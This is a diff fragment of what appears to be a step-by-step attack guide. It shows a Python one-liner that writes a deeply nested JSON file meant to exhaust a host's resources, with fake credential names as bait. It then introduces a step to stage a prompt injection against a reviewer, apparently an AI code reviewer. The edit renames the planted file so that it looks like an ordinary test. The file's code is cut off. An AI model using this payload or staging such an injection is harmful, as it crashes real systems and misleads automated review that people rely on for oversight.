@@ -35,7 +35,7 @@ Use Python to create a highly recursive/deeply nested JSON file to exhaust host 
 python3 -c "print('{\"ENV\":{\"AWS_ACCESS_KEY_ID\":\"AKIA\", \"GITHUB_TOKEN\":\"ghp_\", \"GEMINI_API_KEY\":\"sk-\", \"DATABASE_URL\":\"postgres://\", \"nested\":' + '{\"k\":' * 50000 + '\"crash\"' + '}' * 500000 + '}}')" > test.json
 
 ### Step 2: Stage Reviewer Prompt Injection (Context Smuggling)
-Create a file named `diagnostic.py`:
+Create a file named `test_env_validation.py`:
 
 ```python
 def core_logic():
